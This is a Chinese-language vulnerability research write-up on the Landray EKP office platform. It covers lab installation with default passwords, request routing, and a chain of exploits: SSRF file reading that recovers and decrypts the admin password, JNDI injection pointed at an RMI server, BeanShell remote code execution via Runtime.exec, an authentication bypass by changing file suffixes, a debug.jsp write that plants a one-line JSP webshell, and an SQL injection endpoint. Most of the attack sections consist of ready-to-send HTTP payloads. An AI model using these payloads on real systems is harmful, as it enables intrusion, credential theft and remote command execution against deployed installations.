# 蓝凌EKP

## 环境安装
*   （1）安装mysql、sql server等数据库之一，创建一个名为ekp的数据库，字符集设置为UTF-8
*   （2）获取安装文件：linux64.zip，ekp.zip，将二者解压放在同一目录下，例如`C:\Users\Administrator\Desktop\v15\`下
*   （3）windows下要求安装有jdk7，并配置`JAVA_HOME`环境变量
*   （4）修改系统时间至2021-04-26之前（根据自身Landray的授权截止时间更改）
*   （5）复制ekp文件夹中`web-safe.xml`的内容到`web.xml`。（直接覆盖）
*   （6）切到目录的`\linux64\tomcat\bin`，命令行中执行`.\catalina.bat run`启动服务器
*   （7）服务成功启动后访问，http://ip:8080/ekp/admin.do，此时页面密码为`Password1`（这个密码位于`/ekp/WEB-INF/KmssConfig/admin.properties`）
*   （8）根据前面配置的数据库，更改数据库连接url（将服务器地址landray.com.cn换成本机的，如127.0.0.1），测试数据库连接。另外，可修改附件存放地址，默认为`C:\landray\kmss\resource`。修改完页面配置后，点击保存，会要求重启服务器
*   （9）重启服务器之前，复制ekp文件夹中的`web-normal.xml`到`web.xml`（此处需要注意，更改了第五步中的web.xml，否则启动失败）。然后再执行`.\catalina.bat run`启动服务器
*   （10）重启成功后，访问`http://ip:8080/ekp/sys/profile/index.jsp`，登陆的默认用户名密码为：`admin 1`，然后系统会要求更改`1`这个过于简单的密码
*   （11）访问`http://ip:8080/ekp/sys/profile/index.jsp`进入蓝凌后台，然后选择`运维管理-管理员工具箱-系统初始化`，进行系统初始化操作
*   （12）如果想要调试蓝凌EKP的代码，可以在服务器启动时采用命令`.\catalina.bat jpda start`启动服务器，这样默认的监听端口为8000

## 路由分析
*   （1）路由特点。所有jsp或class的访问路径为该文件到ekp目录之前的相对路径，例如`/ekp/sys/common/dataxml.jsp`
*   （2）配置文件。位于`/ekp/WEB-INF/KmssConfig`文件夹下，根据jsp或class对应的文件夹路径，可在KmssConfig下查找该路径下的各类配置内容。`spring-mvc.xml`定义了类、访问路径和对应jsp的关系；`spring.xml`中定义了其他的类。所以路径要从`spring-mvc.xml`中查找（有些版本蓝凌用的struts.xml）
*   （3）可访问的class入口类命名为`xxController`、`xxAction`，都可以在每个目录的`actions`文件夹下查找，例如`/ekp/WEB-INF/classes/com/landray/kmss/common/actions`，入口类对应的访问路径按（2）中的方式查找
*   （4）请求执行流程。先经过Tomcat的ApplicationFilterChain（包含蓝凌配置的各类Filter、SpringSecurity），然后Spring的DispatcherServlet将请求分发到某个xxActionController，最终执行到其子类的execute方法（如果子类没有execute方法就逐层寻找父类的execute），然后通过dispatchMethod()方法分发到子类的某个具体方法
*   （5）SpringSecurity配置。`/ekp/WEB-INF/KmssConfig/sys`文件夹下有两个关于SpringSecurity的配置——Authentication（认证）和Authorization（授权）文件夹

## 已知漏洞
 - [1.custom.jsp文件读取漏洞](#custom文件读取)
 - [2.admin.do jndi漏洞](#jndi攻击admin)
 - [3.BeanShell漏洞](#利用beanshell进行攻击)
 - [4.jsp未授权访问漏洞](#jsp未授权访问)
 - [5.XMLdecoder反序列化漏洞](#xmldecoder反序列化)
 - [6.debug.jsp写文件漏洞](#debug_jsp写文件)
 - [7.kmImeetingRes.do sql注入漏洞](#sql注入)

### custom文件读取
custom.jsp文件内容如下
```jsp
<%@page import="com.landray.kmss.util.ResourceUtil"%>
<%@page import="net.sf.json.JSONArray"%>
<%@page import="net.sf.json.JSONObject"%>
<%@ page language="java" pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core"%>
<%
	JSONObject vara = JSONObject.fromObject(request.getParameter("var"));
	JSONObject body = JSONObject.fromObject(vara.get("body"));
	if(body.containsKey("file")){
%>
<c:import url='<%=body.getString("file") %>' charEncoding="UTF-8">
	<c:param name="var" value="${ param['var'] }"></c:param>
</c:import>
<% }%>
```
其中的两个jsp标签`<c:import>`和`<c:param>`。`<c:import>`用于请求本地或远程数据/文件，其中必须要传入url参数，url可以是相对路径和绝对路径。`<c:param>`用于指定url的参数

也就是标签部分存在两个值，一个是url，另外一个是加参数后的url。如果传入的url和param如下，那么加参数后的url为`http://a.com?id=test`，会向这个url发起请求，造成SSRF。
```
<c:import url="http://a.com" > 
<c:param name="id" value="test" /> 
</c:import>
```

然后看一下poc，访问路径就是jsp文件在ekp文件夹下的绝对路径，POST的内容需要符合JSON格式，赋值给参数var。通过SSRF利用file协议来读取文件
```
POST /ekp/sys/ui/extend/varkind/custom.jsp
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
```
这样poc经过jsp，url和url加上var参数的值分别如下。也这是为什么url后需要一个`#`来截断（Windows下），以正常读取url对应的文件，否则会报错file not found。
```
url=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#

urlWithParams=file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#?var={"body":{"file":"file:///C:/Users/Administrator/Desktop/v15/ekp/WEB-INF/KmssConfig/admin.properties#"}}
```
读取admin.properties文件，内容如下，其中password是DES加密的
```
password = Ac6OXgTtn4AqNRCxWmSwhg==\r
kmss.properties.encrypt.enabled = true
```
通过在线DES解密网站：http://tool.chacuo.net/cryptdes, 在密码处填入默认密钥`kmssAdminKey`，和待解密的文本`Ac6OXgTtn4AqNRCxWmSwhg==`，进行DES解密后得到
```
Password1
```

### jndi攻击admin
通过customs.jsp得到admin的密码`Password1`，用这个密码可以登陆`http://ip:8080/ekp/admin.do`，然后在系统配置的数据库配置中选择JNDI，页面会多出一行数据源名称的选项，填入`rmi://172.16.165.1:1099/lpkz0d`，点击测试按钮成功执行。拦截的数据包内容如下
```
POST /ekp/admin.do HTTP/1.1
Content-Type: application/x-www-form-urlencoded

method=testDbConn&datasource=rmi%3A%2F%2F172.16.165.1%3A1099%2Flpkz0d
```

### 利用beanshell进行攻击
BeanShell漏洞在国产化软件中很常见，泛微OA、用友NC等都出现过BeanShell漏洞。BeanShell可以在运行时动态执行Java代码，在应用程序的开发中提供很好的可扩展性。其对应的jar包名为`bsh-2.0b4.jar`，只要在lib中看到此jar包都可以查找其相关的入口。最终bsh执行java代码的示例如下
```
Interpreter interpreter = new Interpreter();
Object object=interpreter.eval("exec(\"whoami\")");
```
在蓝凌的`/ekp/WEB-INF/class`的源码中搜索形如上述代码存在的类
```
com.landray.kmss.sys.formula.parser.FormulaParser#parseValueScript
com.landray.kmss.sys.iassister.util.FormulaUtil#parseValueScript
com.landray.kmss.sys.lbpmservice.node.robotnode.support.RobotNodeRunScriptServiceImp#execute
com.landray.kmss.sys.modeling.base.util.ModelingFormulaUtil#parseValueScript
com.landray.kmss.sys.rule.parser.RuleEngineParser#parseValueScript
com.landray.kmss.tic.core.cacheindb.util.ToolUtil#transDataByImpl
com.landray.kmss.tic.sap.sync.service.spring.TicSapSyncUniteQuartzService#findDeleteField
```
上述很多类的执行方法为`parseValueScript()`，查找该方法在web目录下的调用类，包括`SysFormulaValidate、SysFormulaValidateByJS、SysFormulaValidateByScriptEngine、SysFormulaSimulateByJS`等（这些类都实现了IXMLDataBean接口），并且这些类对`parseValueScript()`的调用方法都是`getDataList(RequestContext requestInfo)`。查找调用`getDataList()`方法的类，发现存在一个Controller——`com.landray.kmss.common.actions.DataController`，这个Controller标注的路由为`/data/sys-common`。并且在`datajson()、dataxml()、treexml()`等方法中都调用了`getDataList()`
```java
@RequestMapping(value = {"datajson"}, produces = {"application/json;charset=UTF-8"})
  @ResponseBody
  public RestResponse<JSONArray> datajson(HttpServletRequest request, HttpServletResponse response) throws Exception {
    String s_bean = request.getParameter("s_bean");
    JSONArray array = new JSONArray();
    JSONArray jsonArray = null;
    try {
      Assert.notNull(s_bean, ");
      RequestContext requestInfo = new RequestContext(request, true);
      String[] beanList = s_bean.split(";");
      List result = null;
      for (int i = 0; i < beanList.length; i++) {
        IXMLDataBean treeBean = (IXMLDataBean)SpringBeanUtil.getBean(beanList[i]); // s_bean的值对应某个实现自IXMLDataBean接口的类
        result = treeBean.getDataList(requestInfo); // 触发getDataList
	...
}
```
另外，发现类似的代码也出现在jsp文件中，如dataxml.jsp、datajson.jsp、treexml.jsp等
```jsp
<%@ page import="org.springframework.context.ApplicationContext,
	org.springframework.web.context.support.WebApplicationContextUtils,
	com.landray.kmss.common.service.IXMLDataBean,
	com.landray.kmss.common.actions.RequestContext,
	com.landray.kmss.util.StringUtil,
	org.apache.commons.lang.StringEscapeUtils,
	java.util.*
"%>
RequestContext requestInfo = new RequestContext(request);
String[] beanList = request.getParameter("s_bean").split(";");
IXMLDataBean treeBean;

sout.append("<dataList>");
for(i=0; i<beanList.length; i++){
    treeBean = (IXMLDataBean) ctx.getBean(beanList[i]);
    nodes = treeBean.getDataList(requestInfo);
    ...
}
```
最终搜索到的能触发BeanShell的路径如下（如果是通过customs.jsp访问其他jsp文件，则不需要`/ekp/`前缀路径）
```
/ekp/sys/common/dataxml.jsp
/ekp/sys/common/datajson.jsp
/ekp/sys/common/treexml.jsp
/ekp/sys/common/treejson.jsp
/ekp/data/sys-common/dataxml
/ekp/data/sys-common/datajson
/ekp/data/sys-common/treexml
```
发送的请求数据包如下
```
POST /ekp/sys/ui/extend/varkind/custom.jsp HTTP/1.1
Content-Type: application/x-www-form-urlencoded

var={"body":{"file":"/sys/common/dataxml.jsp"}}&s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc")&type=int&modelName=test
```

与之类似的还有erp_data.jsp，但它的接受bean的参数为`String service=request.getParameter("erpServcieName");`，发送请求时只需要将上述的s_bean换为erpServcieName
```
/tic/core/resource/js/erp_data.jsp
```


### jsp未授权访问
BeanShell攻击中用到的jsp文件都是需要访问权限的，其访问路径均为`/sys/common/xx.jsp`，对应的配置文件为`/ekp/WEB-INF/KmssConfig/sys/authentication/spring.xml`，部分内容如下，可以看到对于sys目录下的静态文件，都采用resourceCacheFilter进行过滤，但是该过滤器没有权限校验过程
```xml
    <bean id="org.springframework.security.filterChainProxy" 
        name="springSecurityFilterChain"
        class="org.springframework.security.web.FilterChainProxy">
        <constructor-arg>
             <list value-type="org.springframework.security.web.SecurityFilterChain">
                <sec:filter-chain pattern="/**/*.gif" filters="resourceCacheFilter" />
                <sec:filter-chain pattern="/**/*.jpg" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.png" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.bmp" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.ico" filters="resourceCacheFilter" />  
                <sec:filter-chain pattern="/**/*.css" filters="resourceCacheFilter,gzipFilter" />
                <sec:filter-chain pattern="/**/*.js" filters="resourceCacheFilter,gzipFilter" />  
                <sec:filter-chain pattern="/**/*.tmpl" filters="resourceCacheFilter,gzipFilter" />  
                <sec:filter-chain pattern="/**/*.html" filters="gzipFilter" />
                <sec:filter-chain pattern="/api/**" filters="restApiAuthFilter" />                
                <!-- 其它资源 kmssSessionManagerFilter -->
                <sec:filter-chain  pattern="/**"
                    filters="securityContextPersistenceFilter,
                    sysLogOperFilter,
                    concurrentSessionFilter,
                    kmssProcessingFilterProxy,
                    exceptionTranslationFilter,
                    filterInvocationInterceptor" />
             </list>
         </constructor-arg>
    </bean>
```
所以可以不通过custom.jsp的方式来访问这些jsp，可以采用更改jsp文件后缀的方式，例如想要访问dataxml.jsp，可以将其改为访问dataxml.js或者dataxml.tmpl等方式
```
POST /data/sys-common/dataxml.js HTTP/1.1
Host: test.com
Content-Type: application/x-www-form-urlencoded

s_bean=sysFormulaValidate&script=Runtime.getRuntime().exec("calc.exe");
```

### xmldecoder反序列化
XMLDecoder是**JDK自带**的处理XML文档的类库，将xml格式反序列化为Java对象。与之对应的序列化类为XMLEncoder。XMLDecoder反序列化基础用法如下
```
XMLDecoder xmlDecoder = xmlDecoder = new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));
Object o = xmlDecoder.readObject();
```
以`/ekp/WEB-INF/KmssConfig/sys/search/spring-mvc.xml`为例，xml内容如下
```xml
<bean
	name="/sys/search/sys_search_main/sysSearchMain.do"
	class="com.landray.kmss.sys.search.actions.SysSearchMainAction"
	lazy-init="true"
	parent="KmssBaseAction">
	<property
		name="formType"
		value="com.landray.kmss.sys.search.forms.SysSearchMainForm" />
	<property name="forwards">
		<map>
			<entry
				key="view"
				value="/sys/search/sys_search_main/sysSearchMain_view.jsp" />
			...
			<entry
				key="editParam"
				value="/sys/search/sys_search_main/sysSearchMain_param.jsp" />
		</map>
	</property>
</bean>
```


### debug_jsp写文件
漏洞位于`/ekp/sys/common/debug.jsp`，fdCode传入的内容会直接写入到`<" + "% " + code + " %" + ">";`code的位置，然后将这段jsp代码写入到`/sys/common/code.jsp`中
```
<%
    String code = request.getParameter("fdCode");
    if(code!=null){
        code = "<"+"%@ page language=\"java\" contentType=\"text/html; charset=UTF-8\""+ " pageEncoding=\"UTF-8\"%"+"><" + "% " + code + " %" + ">";
        FileOutputStream outputStream = new FileOutputStream(ConfigLocationsUtil.getWebContentPath()+"/sys/common/code.jsp");
        BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(outputStream, "UTF-8"));
	bw.write(code);
	bw.close();
%>
```
Java最简单的一句话木马如下，现在debug.jsp提供了木马两侧的格式`<% code %>`，只需要将木马内容填入，即可将code.jsp变成一个恶意木马
```
<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
```

### sql注入
```
/ekp/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
```
